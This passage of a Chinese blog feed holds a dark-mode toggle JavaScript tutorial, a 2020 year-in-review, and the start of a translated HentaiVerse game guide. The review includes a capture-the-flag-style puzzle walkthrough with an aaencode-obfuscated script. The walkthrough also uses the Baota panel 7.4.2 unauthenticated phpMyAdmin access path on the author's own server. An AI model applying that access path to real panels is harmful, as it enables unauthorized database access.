applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 